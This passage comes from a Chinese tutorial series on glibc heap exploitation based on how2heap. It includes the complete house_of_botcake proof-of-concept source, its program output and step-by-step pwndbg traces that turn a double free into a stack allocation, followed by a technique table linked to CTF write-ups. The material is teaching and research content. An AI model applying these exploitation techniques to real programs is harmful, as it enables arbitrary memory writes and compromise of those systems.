  mchunk_prev_size = 93824992233952, 
  mchunk_size = 4660, 
  fd = 0x7fffffffe6c0, 
  bk = 0xcd9707df6838000, 
  fd_nextsize = 0x5555555549e0 &lt;__libc_csu_init&gt;, 
  bk_nextsize = 0x7ffff7a05b97 &lt;__libc_start_main+231&gt;
}
```

然后我们把fake_chunks赋给a,为什么使fake_chunks[2]不是fake_chunks,之前已经做过解释,就是因为用户指针mem是从chunk的fd开始的,而不是从pre_size域开始的

现在free掉a

```
pwndbg&gt; bins
tcachebins
0x40 [  1]: 0x7fffffffe590 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

可以看到我们伪造的chunk已经在bins中了,此时只需要我们malloc一个0x40的chunk就可以从链中取出来了

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

对于没有tcache的glibc版本而言,我们需要连续伪造两块size合法的chunk,并且第二块chunk的size并不需要满足fastbin的要求,只要满足合法的size即可

本程序首先初始话了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的fake_chunks

程序先在fake_chunks[1]的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)

之后又在下一处伪造了第二个chunk,即从fake_chunks[8]开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk



## house of botcake

### <a class="reference-link" name="%E5%BA%8F"></a>序

记得文章开头我说过glibc2.29中将我们的tcache double free扼住了咽喉吗，这里我们就可以用house of botcake来修改我们的fd指针了

house of botcake运用了chunk overlapping的方法,将我们的chunk同时放在了unsorted bin和tcache中,与我们的fastbin_dup_consolidate很相似但不太一样

下面我们就来看看这个新增的攻击技巧吧,由于本例的特殊性,我会在ubuntu 19.04的docker上进行调试

首先我们进入源代码

### <a class="reference-link" name="%E6%BA%90%E4%BB%A3%E7%A0%81"></a>源代码

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main()
{
  //本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     */
    //关闭缓冲区并使得_FILE_IO不会影响到我们的堆
    // disable buffering and make _FILE_IO does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    //本demo是一个强力的攻击手段,通过tcache posioning attack来欺骗malloc返回一个指向任意地址的指针
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    //本攻击仅依赖于double free
    puts("This attack only relies on double free.n");

    // prepare the target
    //攻击目标
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.nn", stack_var);

    // prepare heap layout
    //布置一下栈
    puts("Preparing heap layout");
    //首先申请7个大小为0x100的chunks来为后面填满tcache做准备
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    //为了后面consolidation而申请一个chunk
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    //申请我们的vitcim chunk
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.n", a); 
    //申请一个用于防止合并的chunk
    puts("Allocating a padding to prevent consolidation.n");
    malloc(0x10);

    // cause chunk overlapping
    //现在需要我们来做一个chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    //首先填满tcache list
    puts("Step 1: fill up tcache list");
    for(int i=0; i&lt;7; i++){
        free(x[i]);
    }
    //第二步:将我们的victim free掉来让他被扔到unsorted bin中
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    //第三步:free前面的chunk来与我们的victim chunk合并
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    //第四步:通过从tcache中取出一个chunk来把我们的victim chunk放到tcache list中,并且再free一次victim chunk
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim againn");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/

    //简单的tcache poisoning
    // simple tcache poisoning
    puts("Launch tcache poisoning");
    //现在victim被包含在一个更大的free chunk中,我们可以通过overlapp chunk来做一个简单的tcache poisoning
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;

    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %pn", c);

    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!nn");

    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");
    //请注意,关于本技术还有一个非常完美的东西,如果我们可以再次free b,free victim,并且可以修改victim的fwd指针,一旦我们成功利用本技术,那么就意味着我们拥有了多次很简单的任意写的机会了

    return 0;
}
```

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"></a>程序运行结果

```
This file demonstrates a powerful tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this demo, the stack).
This attack only relies on double free.

The address we want malloc() to return, namely,
the target address is 0x7fff07789970.

Preparing heap layout
Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.
Allocating a chunk for later consolidation
Allocating the victim chunk.
malloc(0x100): a=0x564e770f6ae0.
Allocating a padding to prevent consolidation.

Now we are able to cause chunk overlapping
Step 1: fill up tcache list
Step 2: free the victim chunk so it will be added to unsorted bin
Step 3: free the previous chunk and make it consolidate with the victim chunk.
Step 4: add the victim chunk to tcache list by taking one out from it and free victim again

Launch tcache poisoning
Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk
We simply overwrite victim's fwd pointer
Now we can cash out the target chunk.
The new chunk is at 0x7fff07789970
Got control on target/stack!

Note:
And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim
In that case, once you have done this exploitation, you can have many arbitary writes very easily.

```

### <a class="reference-link" name="%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"></a>关键代码调试

下面我们就直接来调试吧,断点如下:

```
31     puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
   32     intptr_t *x[7];
   33     for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++){
   34         x[i] = malloc(0x100);
   35     }
 _ 36     puts("Allocating a chunk for later consolidation");

   37     intptr_t *prev = malloc(0x100);
   38     puts("Allocating the victim chunk.");
   39     intptr_t *a = malloc(0x100);
   40     printf("malloc(0x100): a=%p.n", a); 
   41     puts("Allocating a padding to prevent consolidation.n");
 _ 42     malloc(0x10);

   47     for(int i=0; i&lt;7; i++){
   48         free(x[i]);
   49     }
 _ 50     puts("Step 2: free the victim chunk so it will be added to unsorted bin");
```

可以看到我这里只下了三个断点,50行之后我们都单步来调试他,下面我们开始吧

首先是我们申请的heap

```
pwndbg&gt; p/x x                                                                                                                                                                                                   
$2 = {0x555555559260, 0x555555559370, 0x555555559480, 0x555555559590, 0x5555555596a0, 0x5555555597b0, 0x5555555598c0}
```

然后是我们的chunk prev,a 还有用来防止合并的chunk

```
0x5555555599c0 PREV_INUSE {
  mchunk_prev_size = 0,
  mchunk_size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x555555559ad0 PREV_INUSE {
  mchunk_prev_size = 0,
  mchunk_size = 273,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x555555559be0 FASTBIN {
  mchunk_prev_size = 0,
  mchunk_size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x20401
}
```

到这里结束,就是我们对堆做的一个简答的构造布局了,下面开始我们的overlapping的构造

首先来填满我们的tcache-list

```
pwndbg&gt; bins
tcachebins
0x110 [  7]: 0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0                                                                  
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

因为我们0x110的tcache-list被填满了,因此这里我们再free a就会进入unsorted bin了

```
pwndbg&gt; bins
tcachebins
0x110 [  7]: 0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555559ad0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559ad0
smallbins
empty
largebins
empty
```

因为我们的prev和a是连在一起的chunk,因此此时我们再free prev就会触发和在unsorted bin中与a的合并,也就是

```
pwndbg&gt; bins
tcachebins
0x110 [  7]: 0x5555555598c0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555555599c0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x5555555599c0
smallbins
empty
largebins
empty
pwndbg&gt; x/10gx 0x5555555599c0
0x5555555599c0: 0x0000000000000000      0x0000000000000221
0x5555555599d0: 0x00007ffff7fbcca0      0x00007ffff7fbcca0
0x5555555599e0: 0x0000000000000000      0x0000000000000000
0x5555555599f0: 0x0000000000000000      0x0000000000000000
0x555555559a00: 0x0000000000000000      0x0000000000000000
```

可以看到,此时被合并后的大chunk仍在unsortedbin 中且大小为0x221

现在让我们从tcache list中取出一个chunk来留下一个位置

```
pwndbg&gt; bins
tcachebins
0x110 [  6]: 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
```

现在我们再free一次a,为什么能成功呢?

因为我们的prev和a已经合并了,此时free list上并没有a的信息,因此我们可以再次free一次a

```
pwndbg&gt; bins
tcachebins
0x110 [  7]: 0x555555559ae0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555555599c0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x5555555599c0
smallbins
empty
largebins
empty
```

可以看到此时我们的a已经被链入free list中,属于tcache

现在我们的a既在tcache中,又在我们的unsorted bin的大chunk中

此时我们malloc b(0x120),系统就会从我们的unsorted bin中切出一块来给他,把剩下的留在unsorted bin中,也就意味着b会从之前prev的地方开始，并且和a有交集，也就是成功构造了overlapping

```
pwndbg&gt; bins
tcachebins
0x110 [  7]: 0x555555559ae0 __ 0x5555555597b0 __ 0x5555555596a0 __ 0x555555559590 __ 0x555555559480 __ 0x555555559370 __ 0x555555559260 __ 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555559af0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559af0
smallbins
empty
largebins
empty
```

现在我们的unsorted bin中的chunk就是从0x555555559af0处开始的了

现在我们通过b来覆写a的fwd指针

我们先来看看我们现在a的结构

```
$20 = {
  mchunk_prev_size = 0x0, 
  mchunk_size = 0x111, 
  fd = 0x5555555597b0, 
  bk = 0x555555559010, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0xf1
}
```

之后是覆写后a的结构

```
$21 = {
  mchunk_prev_size = 0x0,
  mchunk_size = 0x111,
  fd = 0x7fffffffe570,
  bk = 0x555555559010,
  fd_nextsize = 0x0,
  bk_nextsize = 0xf1
}
```

可以看到我们a的fd指针已经被更改了,此时我们的tcache链

```
pwndbg&gt; bins
tcachebins
0x110 [  7]: 0x555555559ae0 __ 0x7fffffffe570 __ 0xc2
```

现在就可以看到结果了,我们先malloc一块出来

```
pwndbg&gt; bins
tcachebins
0x110 [  6]: 0x7fffffffe570 __ 0xc2
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x555555559af0 __ 0x7ffff7fbcca0 (main_arena+96) __ 0x555555559af0
smallbins
empty
largebins
empty
```

现在就只剩下我们想分配的内存了,下面我们把他分配出来

```
pwndbg&gt; p/x c
$22 = 0x7fffffffe570
```

成功

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果

首先程序先在栈上声明了一个变量

之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备

然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)

到此准备工作就结束了

下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache

之后程序free掉了a，a被放入了unsorted bin中

此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中

此时free list上就没有了a的信息

现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了

此时，我们的a既在tcache中，又在unsortedbin的大chunk中

也就是完成了一个double free

之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中

此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上

此时，我们再申请两次就可以分配到栈上的地址了



## 完结

本系列到此就结束了，但堆的利用方式远远不止这些技巧，但万变不离其宗，希望看我文章的同学在不懂的地方也动手调试一下

本文对堆的很多利用方式也给了我们一些启示，在寻找一些新的利用方式时，也就是审源码时，只要是没有被检查的地方都有可能是我们可以利用的地方

也十分感谢shellphish团队的开源精神！

再次贴出项目地址: [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)

最后也在这里贴出how2heap对于本项目的一个相关总结吧，说来也巧，在我写到这的时候正好遇到该项目把house_of_botcake加到了readme中，这里我也加上了

|文件|技术|Glibc版本|对应的ctf题目
|------
|[first_fit.c](first_fit.c)|演示了glibc的first fit原则.||
|[calc_tcache_idx.c](calc_tcache_idx.c)|演示如何计算tcache索引的方法.||
|[fastbin_dup.c](fastbin_dup.c)|通过控制fast bin free list 来欺骗malloc,从而获得一个已经分配过的堆指针||
|[fastbin_dup_into_stack.c](glibc_2.25/fastbin_dup_into_stack.c)|通过构造fast bin free list来欺骗malloc,从而获得一个指向任意地址的堆指针|latest|[9447-search-engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine), [0ctf 2017-babyheap](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html)
|[fastbin_dup_consolidate.c](glibc_2.25/fastbin_dup_consolidate.c)|通过把一个指针既放到fastbin freelist中又放到unsorted bin中来欺骗malloc,从而获得一个已经分配了的堆指针|latest|[Hitcon 2016 SleepyHolder](https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder)
|[unsafe_unlink.c](glibc_2.26/unsafe_unlink.c)|利用free在一个corrupted chunk上获得任意写的能力.|&lt; 2.26|[HITCON CTF 2014-stkof](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/), [Insomni’hack 2017-Wheel of Robots](https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a)
|[house_of_spirit.c](glibc_2.25/house_of_spirit.c)|通过释放一个伪造的fastbin来获得一个指向任意地址的指针.|latest|[hack.lu CTF 2014-OREO](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo)
|[poison_null_byte.c](glibc_2.25/poison_null_byte.c)|利用单个空字节溢出|&lt; 2.26|[PlaidCTF 2015-plaiddb](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb)
|[house_of_lore.c](glibc_2.26/house_of_lore.c)|通过伪造smallbin freelist来欺骗malloc,从而获得一个指向任意地址的指针|&lt; 2.26|
|[overlapping_chunks.c](glibc_2.26/overlapping_chunks.c)|通过溢出修改一个free 掉的 unsorted bin的size来使得新分配的chunk与已经存在的chunk产生重叠|&lt; 2.26|[hack.lu CTF 2015-bookstore](https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore), [Nuit du Hack 2016-night-deamonic-heap](https://github.com/ctfs/write-ups-2016/tree/master/nuitduhack-quals-2016/exploit-me/night-deamonic-heap-400)
|[overlapping_chunks_2.c](glibc_2.25/overlapping_chunks_2.c)|利用溢出漏洞修改一个正在使用的chunk的size来使得我们新分配的chunk和已经存在的chunk产生重叠|latest|
|[house_of_force.c](glibc_2.25/house_of_force.c)|利用top chunk的hearder来让malloc返回一个几乎指向任意地址的内存|&lt; 2.29|[Boston Key Party 2016-cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6), [BCTF 2016-bcloud](https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200)
|[unsorted_bin_into_stack.c](glibc_2.26/unsorted_bin_into_stack.c)|利用溢出漏洞修改一个在unsorted bin freelist的被free掉的chunk来获得一个指向几乎任意地址的指针|&lt; 2.26|
|[unsorted_bin_attack.c](glibc_2.26/unsorted_bin_attack.c)|利用溢出一个在unsorted bin freelist的被free掉的chunk来将一个超大的值写到任意地址|&lt; 2.28|[0ctf 2016-zerostorage](https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6)
|[large_bin_attack.c](glibc_2.26/large_bin_attack.c)|利用溢出一个在large bin freelist上的被Free掉的chunk来向任意地址写一个超大的值|&lt; 2.26|[0ctf 2018-heapstorm2](https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/)
|[house_of_einherjar.c](glibc_2.26/house_of_einherjar.c)|利用一个空字节溢出来欺骗malloc,从而获得一个被我们控制的指针|&lt; 2.26|[Seccon 2016-tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf)
|[house_of_orange.c](glibc_2.25/house_of_orange.c)|利用top chunk来获得任意代码执行的方法|&lt; 2.26|[Hitcon 2016 houseoforange](https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500)
|[tcache_dup.c](glibc_2.26/tcache_dup.c)|通过控制tcache freelist来欺骗malloc,从而获得一个已经分配的堆指针|2.26 – 2.28|
|[tcache_poisoning.c](glibc_2.26/tcache_poisoning.c)|通过控制tcache freelist来欺骗malloc从而获得一个机会指向任意地址的指针|&gt; 2.25|
|[tcache_house_of_spirit.c](glibc_2.26/tcache_house_of_spirit.c)|free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针|&gt; 2.25|
|[house_of_botcake.c](glibc_2.26/house_of_botcake.c)|bypass tcache的 double free的检查|&gt;2.25
